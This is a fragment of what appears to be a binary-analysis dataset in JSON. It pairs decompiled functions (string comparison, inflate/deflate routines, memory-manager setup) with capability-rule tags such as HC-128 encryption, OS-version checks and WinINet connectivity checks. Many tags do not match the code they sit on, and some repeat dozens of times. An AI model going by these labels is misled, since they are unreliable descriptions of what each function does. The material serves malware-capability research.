        "decompiled_code": "\nchar * __fastcall fcn.00405974(uint param_1, char *param_2)\n\n{\n    uint32_t uVar1;\n    char *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    \n    if (in_EAX != param_2) {\n        if ((in_EAX & param_2) == 0) {\n            if (in_EAX == NULL) {\n                return NULL;\n            }\n            if (param_2 == NULL) {\n                return in_EAX;\n            }\n        }\n        if (*in_EAX - *param_2 == 0) {\n            uVar5 = *(in_EAX + -4) - *(param_2 + -4);\n            iVar3 = (((*in_EAX - *param_2) - 1) + (*(in_EAX + -4) < *(param_2 + -4)) & uVar5) - *(in_EAX + -4);\n            uVar2 = in_EAX - iVar3;\n            iVar4 = iVar3;\n            while (uVar6 = *(iVar4 + uVar2) ^ *(param_2 + (iVar4 - iVar3)),  uVar6 == 0) {\n                iVar4 = iVar4 + 4;\n                if (-1 < iVar4) goto code_r0x004059a4;\n            }\n            uVar1 = 0;\n            if (uVar6 != 0) {\n                for (; (uVar6 >> uVar1 & 1) == 0; uVar1 = uVar1 + 1) {\n                }\n            }\n            iVar4 = iVar4 + (uVar1 >> 3);\n            if (iVar4 < 0) {\n                return uVar2 & 0xffffff00 | *(iVar4 + uVar2);\n            }\ncode_r0x004059a4:\n            in_EAX = uVar5 * 2;\n        }\n    }\n    return in_EAX;\n}\n",
        "token_count": 448
    },
    "004098dc": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004098dc(uint param_1, uint8_t *param_2)\n\n{\n    uint32_t uVar1;\n    uint8_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    \n    if (in_EAX == param_2) {\n        return 0;\n    }\n    if ((in_EAX & param_2) == 0) {\n        if (in_EAX == NULL) {\n            return -*(param_2 + -4);\n        }\n        if (param_2 == NULL) {\n            return *(in_EAX + -4);\n        }\n    }\n    if (*param_2 != *in_EAX) {\n        return *in_EAX - *param_2;\n    }\n    uVar4 = *(in_EAX + -4) - *(param_2 + -4);\n    iVar2 = ((*(in_EAX + -4) < *(param_2 + -4)) - 1 & uVar4) - *(in_EAX + -4);\n    iVar3 = iVar2;\n    while (uVar5 = *(in_EAX + (iVar3 - iVar2)) ^ *(param_2 + (iVar3 - iVar2)),  uVar5 == 0) {\n        iVar3 = iVar3 + 4;\n        if (-1 < iVar3) {\n            return uVar4;\n        }\n    }\n    uVar1 = 0;\n    if (uVar5 != 0) {\n        for (; (uVar5 >> uVar1 & 1) == 0; uVar1 = uVar1 + 1) {\n        }\n    }\n    iVar3 = iVar3 + (uVar1 >> 3);\n    if (-1 < iVar3) {\n        return uVar4;\n    }\n    return in_EAX[iVar3 - iVar2] - param_2[iVar3 - iVar2];\n}\n",
        "token_count": 429
    },
    "00470338": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00470338(uint param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint uVar8;\n    uint8_t *puVar9;\n    uint8_t **in_EAX;\n    uint8_t *puVar10;\n    uint32_t uVar11;\n    uint8_t *puVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    uint8_t *puVar16;\n    uint8_t *puVar17;\n    uint8_t *puVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint8_t *puStack72;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uint uStack16;\n    \n    puVar1 = in_EAX[7];\n    puStack72 = *in_EAX + -1;\n    puVar12 = in_EAX[1] + -5 + puStack72;\n    puVar17 = in_EAX[3] + -1;\n    iVar13 = puVar17 - (param_2 - in_EAX[4]);\n    puVar10 = in_EAX[4] + -0x101 + puVar17;\n    iVar2 = puVar1[9];\n    uVar3 = puVar1[10];\n    uVar4 = puVar1[0xb];\n    iVar14 = puVar1[0xc];\n    uStack40 = puVar1[0xd];\n    uStack36 = puVar1[0xe];\n    iVar5 = puVar1[0x12];\n    iVar6 = puVar1[0x13];\n    uVar7 = puVar1[0x14];\n    uVar8 = puVar1[0x15];\ncode_r0x00470406:\n    if (uStack36 < 0xf) {\n        puVar9 = puStack72 + 1;\n        puStack72 = puStack72 + 2;\n        uStack40 = uStack40 + (*puVar9 << (uStack36 & 0x1f)) + (*puStack72 << (uStack36 + 8 & 0x1f));\n        uStack36 = uStack36 + 0x10;\n    }\n    uStack16 = *(iVar5 + (uStack40 & (1 << (uVar7 & 0x1f)) - 1U) * 4);\n    while( true ) {\n        uStack40 = uStack40 >> (uStack16._1_1_ & 0x1f);\n        uStack36 = uStack36 - uStack16._1_1_;\n        if ((uStack16 & 0xff) == 0) break;\n        if ((uStack16 & 0x10) != 0) {\n            uVar11 = uStack16._2_2_;\n            uVar19 = uStack16 & 0xf;\n            if ((uStack16 & 0xf) != 0) {\n                if (uStack36 < uVar19) {\n                    puStack72 = puStack72 + 1;\n                    uStack40 = uStack40 + (*puStack72 << (uStack36 & 0x1f));\n                    uStack36 = uStack36 + 8;\n                }\n                uVar11 = uVar11 + ((1 << uVar19) - 1U & uStack40);\n                uStack40 = uStack40 >> uVar19;\n                uStack36 = uStack36 - uVar19;\n            }\n            if (uStack36 < 0xf) {\n                puVar9 = puStack72 + 1;\n                puStack72 = puStack72 + 2;\n                uStack40 = uStack40 + (*puVar9 << (uStack36 & 0x1f)) + (*puStack72 << (uStack36 + 8 & 0x1f));\n                uStack36 = uStack36 + 0x10;\n            }\n            uStack16 = *(iVar6 + (uStack40 & (1 << (uVar8 & 0x1f)) - 1U) * 4);\n            goto code_r0x0047051a;\n        }\n        if ((uStack16 & 0x40) != 0) {\n            if ((uStack16 & 0x20) == 0) {\n                in_EAX[6] = 0x490c60;\n                *puVar1 = 0x12;\n            }\n            else {\n                *puVar1 = 3;\n            }\n            goto code_r0x0047078f;\n        }\n        uStack16 = *(iVar5 + (((1 << (uStack16 & 0x1f)) - 1U & uStack40) + uStack16._2_2_) * 4);\n    }\n    puVar17[1] = uStack16._2_1_;\n    puVar17 = puVar17 + 1;\n    goto code_r0x0047077b;\ncode_r0x0047051a:\n    uStack40 = uStack40 >> (uStack16._1_1_ & 0x1f);\n    uVar19 = uStack36 - uStack16._1_1_;\n    uStack36 = uVar19;\n    if ((uStack16 & 0x10) != 0) goto code_r0x0047053a;\n    if ((uStack16 & 0x40) != 0) {\n        in_EAX[6] = 0x490c4a;\n        *puVar1 = 0x12;\n        goto code_r0x0047078f;\n    }\n    uStack16 = *(iVar6 + (((1 << (uStack16 & 0x1f)) - 1U & uStack40) + uStack16._2_2_) * 4);\n    goto code_r0x0047051a;\ncode_r0x0047053a:\n    uStack16 = uStack16 & 0xf;\n    puVar9 = puStack72;\n    if (uVar19 < uStack16) {\n        uStack40 = uStack40 + (puStack72[1] << (uVar19 & 0x1f));\n        uStack36 = uVar19 + 8;\n        puVar9 = puStack72 + 1;\n        if (uStack36 < uStack16) {\n            uStack40 = uStack40 + (puStack72[2] << (uStack36 & 0x1f));\n            uStack36 = uVar19 + 0x10;\n            puVar9 = puStack72 + 2;\n        }\n    }\n    puStack72 = puVar9;\n    uVar19 = (1 << uStack16) - 1U & uStack40;\n    uStack40 = uStack40 >> uStack16;\n    uStack36 = uStack36 - uStack16;\n    uVar20 = puVar17 - iVar13;\n    uVar19 = uStack16._2_2_ + uVar19;\n    if (uVar20 < uVar19) {\n        uVar20 = uVar19 - uVar20;\n        if (uVar3 < uVar20) {\n            in_EAX[6] = 0x490c2c;\n            *puVar1 = 0x12;\ncode_r0x0047078f:\n            puStack72 = puStack72 + -(uStack36 >> 3);\n            iVar2 = uStack36 - (uStack36 & 0xfffffff8);\n            *in_EAX = puStack72 + 1;\n            in_EAX[3] = puVar17 + 1;\n            if (puStack72 < puVar12) {\n                iVar14 = puVar12 - puStack72;\n            }\n            else {\n                iVar14 = -(puStack72 - puVar12);\n            }\n            in_EAX[1] = iVar14 + 5;\n            if (puVar17 < puVar10) {\n                iVar14 = puVar10 - puVar17;\n            }\n            else {\n                iVar14 = -(puVar17 - puVar10);\n            }\n            in_EAX[4] = iVar14 + 0x101;\n            puVar1[0xd] = uStack40 & (1 << (iVar2 & 0x1f)) - 1U;\n            puVar1[0xe] = iVar2;\n            return;\n        }\n        iVar15 = iVar14 + -1;\n        puVar9 = puVar17;\n        if (uVar4 == 0) {\n            puVar16 = iVar15 + (iVar2 - uVar20);\n            if (uVar20 < uVar11) {\n                uVar11 = uVar11 - uVar20;\n                do {\n                    puVar17 = puVar17 + 1;\n                    puVar16 = puVar16 + 1;\n                    *puVar17 = *puVar16;\n                    uVar20 = uVar20 - 1;\n                } while (uVar20 != 0);\n                puVar16 = puVar17 + -uVar19;\n                puVar9 = puVar17;\n            }\n        }\n        else if (uVar4 < uVar20) {\n            puVar16 = iVar15 + ((iVar2 + uVar4) - uVar20);\n            uVar20 = uVar20 - uVar4;\n            if (uVar20 < uVar11) {\n                uVar11 = uVar11 - uVar20;\n                do {\n                    puVar17 = puVar17 + 1;\n                    puVar16 = puVar16 + 1;\n                    *puVar17 = *puVar16;\n                    uVar20 = uVar20 - 1;\n                } while (uVar20 != 0);\n                puVar16 = iVar14 + -1;\n                puVar9 = puVar17;\n                if (uVar4 < uVar11) {\n                    uVar11 = uVar11 - uVar4;\n                    uVar20 = uVar4;\n                    do {\n                        puVar17 = puVar17 + 1;\n                        puVar16 = puVar16 + 1;\n                        *puVar17 = *puVar16;\n                        uVar20 = uVar20 - 1;\n                    } while (uVar20 != 0);\n                    puVar16 = puVar17 + -uVar19;\n                    puVar9 = puVar17;\n                }\n            }\n        }\n        else {\n            puVar16 = iVar15 + (uVar4 - uVar20);\n            if (uVar20 < uVar11) {\n                uVar11 = uVar11 - uVar20;\n                do {\n                    puVar17 = puVar17 + 1;\n                    puVar16 = puVar16 + 1;\n                    *puVar17 = *puVar16;\n                    uVar20 = uVar20 - 1;\n                } while (uVar20 != 0);\n                puVar16 = puVar17 + -uVar19;\n                puVar9 = puVar17;\n            }\n        }\n        for (; 2 < uVar11; uVar11 = uVar11 - 3) {\n            puVar17 = puVar16 + 2;\n            puVar9[1] = puVar16[1];\n            puVar16 = puVar16 + 3;\n            puVar9[2] = *puVar17;\n            puVar9[3] = *puVar16;\n            puVar9 = puVar9 + 3;\n        }\n        puVar17 = puVar9;\n        if (uVar11 != 0) {\n            puVar17 = puVar9 + 1;\n            *puVar17 = puVar16[1];\n            if (1 < uVar11) {\n                puVar17 = puVar9 + 2;\n                *puVar17 = puVar16[2];\n            }\n        }\n    }\n    else {\n        puVar9 = puVar17 + -uVar19;\n        do {\n            puVar18 = puVar17;\n            puVar16 = puVar9;\n            puVar18[1] = puVar16[1];\n            puVar18[2] = puVar16[2];\n            puVar17 = puVar18 + 3;\n            uVar11 = uVar11 - 3;\n            *puVar17 = puVar16[3];\n            puVar9 = puVar16 + 3;\n        } while (2 < uVar11);\n        if (uVar11 != 0) {\n            puVar17 = puVar18 + 4;\n            *puVar17 = puVar16[4];\n            if (1 < uVar11) {\n                puVar17 = puVar18 + 5;\n                *puVar17 = puVar16[5];\n            }\n        }\n    }\ncode_r0x0047077b:\n    if ((puVar12 <= puStack72) || (puVar10 <= puVar17)) goto code_r0x0047078f;\n    goto code_r0x00470406;\n}\n",
        "token_count": 2905
    },
    "00473654": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00473654(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint32_t uVar3;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    if (in_EAX[0x20] < 1) {\n        uVar2 = in_ECX + 5;\n        uVar3 = uVar2;\n    }\n    else {\n        if ((in_ECX != 0) && (*(*in_EAX + 0x2c) == 2)) {\n            fcn.00473dec();\n        }\n        fcn.004725cc();\n        fcn.004725cc();\n        var_8h = fcn.00472f70();\n        uVar2 = in_EAX[0x5a9] + 10U >> 3;\n        uVar3 = in_EAX[0x5aa] + 10U >> 3;\n        if (uVar3 <= uVar2) {\n            uVar2 = uVar3;\n        }\n    }\n    if ((uVar2 < in_ECX + 4U) || (in_EDX == 0)) {\n        if ((in_EAX[0x21] == 4) || (uVar2 == uVar3)) {\n            if (in_EAX[0x5ae] < 0xe) {\n                *(in_EAX + 0x5ad) = *(in_EAX + 0x5ad) | arg_8h + 2 << (in_EAX[0x5ae] & 0x1f);\n                in_EAX[0x5ae] = in_EAX[0x5ae] + 3;\n            }\n            else {\n                *(in_EAX + 0x5ad) = *(in_EAX + 0x5ad) | arg_8h + 2U << (in_EAX[0x5ae] & 0x1f);\n                iVar1 = in_EAX[5];\n                in_EAX[5] = in_EAX[5] + 1;\n                *(in_EAX[2] + iVar1) = *(in_EAX + 0x5ad);\n                iVar1 = in_EAX[5];\n                in_EAX[5] = in_EAX[5] + 1;\n                *(in_EAX[2] + iVar1) = *(in_EAX + 0x5ad) >> 8;\n                *(in_EAX + 0x5ad) = (arg_8h + 2U & 0xffff) >> (0x10U - in_EAX[0x5ae] & 0x1f);\n                in_EAX[0x5ae] = in_EAX[0x5ae] + -0xd;\n            }\n            fcn.0047392c();\n        }\n        else {\n            if (in_EAX[0x5ae] < 0xe) {\n                *(in_EAX + 0x5ad) = *(in_EAX + 0x5ad) | arg_8h + 4 << (in_EAX[0x5ae] & 0x1f);\n                in_EAX[0x5ae] = in_EAX[0x5ae] + 3;\n            }\n            else {\n                *(in_EAX + 0x5ad) = *(in_EAX + 0x5ad) | arg_8h + 4U << (in_EAX[0x5ae] & 0x1f);\n                iVar1 = in_EAX[5];\n                in_EAX[5] = in_EAX[5] + 1;\n                *(in_EAX[2] + iVar1) = *(in_EAX + 0x5ad);\n                iVar1 = in_EAX[5];\n                in_EAX[5] = in_EAX[5] + 1;\n                *(in_EAX[2] + iVar1) = *(in_EAX + 0x5ad) >> 8;\n                *(in_EAX + 0x5ad) = (arg_8h + 4U & 0xffff) >> (0x10U - in_EAX[0x5ae] & 0x1f);\n                in_EAX[0x5ae] = in_EAX[0x5ae] + -0xd;\n            }\n            fcn.00472fd4(var_8h + 1);\n            fcn.0047392c();\n        }\n    }\n    else {\n        fcn.004732cc(arg_8h);\n    }\n    fcn.004721fc();\n    if (arg_8h != 0) {\n        fcn.00473ec8();\n    }\n    return;\n}\n",
        "token_count": 1085
    },
    "00401770": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00401770(void)\n\n{\n    char cVar1;\n    \n    if (*0x49304d != '\\0') {\n        while (cVar1 = fcn.00401460(),  cVar1 != '\\0') {\n            if (*0x4935b5 == '\\0') {\n                sub.kernel32.dll_Sleep(0);\n                cVar1 = fcn.00401460();\n                if (cVar1 == '\\0') {\n                    return;\n                }\n                sub.kernel32.dll_Sleep();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "004022f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.004022f4(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    \n    if (((*0x493720 != 0) && (in_EAX <= *0x49371c)) && (*0x49371c <= in_EAX + 0x13fff0)) {\n        uVar1 = *0x49371c;\n        if (*0x493720 == 0x13ffe0) {\n            uVar1 = 0;\n        }\n        return uVar1;\n    }\n    return in_EAX + 0x10;\n}\n",
        "token_count": 134
    },
    "004025c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.004025c8(void)\n\n{\n    uint32_t in_EAX;\n    \n    if (*0x49304d != '\\0') {\n        while (in_EAX = fcn.00401460(),  in_EAX != '\\0') {\n            if (*0x4935b5 == '\\0') {\n                sub.kernel32.dll_Sleep();\n                in_EAX = fcn.00401460();\n                if (in_EAX == '\\0') break;\n                sub.kernel32.dll_Sleep();\n            }\n        }\n    }\n    if (*0x4957bc == 0) {\n        in_EAX = sub.kernel32.dll_VirtualAlloc(0, 0x10000, 0x1000, 4);\n        *0x4957bc = in_EAX;\n    }\n    return in_EAX & 0xffffff00 | *0x4957bc != 0;\n}\n",
        "token_count": 198
    },
    "0040267c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0040267c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    uVar4 = 0;\n    if (*0x4957bc != NULL) {\n        cVar1 = fcn.004025c8();\n        if (cVar1 != '\\0') {\n            iVar3 = **0x4957bc;\n            if (-1 < iVar3 + -1) {\n                iVar2 = 0;\n                do {\n                    if (in_EAX == (*0x4957bc)[iVar2 + 1]) {\n                        (*0x4957bc)[iVar2 + 1] = (*0x4957bc)[**0x4957bc];\n                        **0x4957bc = **0x4957bc + -1;\n                        uVar4 = 1;\n                        break;\n                    }\n                    iVar2 = iVar2 + 1;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n            *0x4957c0 = 0;\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 260
    },
    "00402cdc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00402cdc(void)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    code **ppcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    iVar4 = 0x37;\n    ppcVar3 = 0x48f068;\n    do {\n        if (*ppcVar3 == NULL) {\n            *ppcVar3 = fcn.004015a0;\n        }\n        ppcVar3[-2] = ppcVar3 + -7;\n        ppcVar3[-6] = ppcVar3 + -7;\n        ppcVar3[-4] = NULL;\n        ppcVar3[-5] = 0x1;\n        uVar2 = (*(ppcVar3 + -0x1a) * 0xc + 0xef & 0xffffff00) + 0x30;\n        if (uVar2 < 0xb30) {\n            uVar2 = 0xb30;\n        }\n        uVar2 = uVar2 + 0x4d0 >> 0xd;\n        if (7 < uVar2) {\n            uVar2 = 7;\n        }\n        *(ppcVar3 + -0x1b) = -1 << (uVar2 & 0x1f);\n        *(ppcVar3 + -1) = (uVar2 << 0xd) + 0xb30;\n        uVar1 = *(ppcVar3 + -0x1a);\n        uVar2 = (uVar1 * 0x30 + 0xef & 0xffffff00) + 0x30;\n        if (uVar2 < 0x7330) {\n            uVar2 = 0x7330;\n        }\n        if (0xff30 < uVar2) {\n            uVar2 = 0xff30;\n        }\n        *(ppcVar3 + -2) = (((uVar2 - 0x20) / uVar1) * uVar1 + 0xef & 0xff00) + 0x30;\n        ppcVar3 = ppcVar3 + 8;\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    fcn.00402c98();\n    *0x493708 = 0x493708;\n    *0x49370c = 0x493708;\n    iVar5 = 0x400;\n    iVar4 = 0x4937a8;\n    do {\n        *iVar4 = iVar4;\n        *(iVar4 + 4) = iVar4;\n        iVar4 = iVar4 + 8;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    *0x4957ac = 0x4957ac;\n    *0x4957b0 = 0x4957ac;\n    return;\n}\n",
        "token_count": 641
    },
    "00402e94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00402e94(void)\n\n{\n    if (*0x4957c4 != 0) {\n        sub.user32.dll_DestroyWindow(*0x4957c4);\n        *0x4957c4 = 0;\n    }\n    if (*0x4935b4 != '\\0') {\n        fcn.00402820();\n    }\n    if (*0x4957bc != 0) {\n        sub.kernel32.dll_VirtualFree(*0x4957bc, 0, 0x8000);\n        *0x4957bc = 0;\n    }\n    fcn.00402e04();\n    return;\n}\n",
        "token_count": 142
    },
    "00403050": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00403050(void)\n\n{\n    uint8_t in_AL;\n    \n    if (*0x493008 != NULL) {\n        (**0x493008)();\n    }\n    if ((in_AL & 0x7f) == 0) {\n        fcn.00407688();\n    }\n    fcn.00402ff8();\n    return;\n}\n",
        "token_count": 79
    },
    "00402f84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00402f84(void)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = fcn.00407688();\n    if (*piVar1 != 0) {\n        piVar1 = fcn.00407688();\n        return *(*piVar1 + 8);\n    }\n    return 0;\n}\n",
        "token_count": 75
    },
    "00402fa4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00402fa4(void)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = fcn.00407688();\n    if (*piVar1 != 0) {\n        piVar1 = fcn.00407688();\n        return *(*piVar1 + 4);\n    }\n    return 0;\n}\n",
        "token_count": 75
    },
    "0040305c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
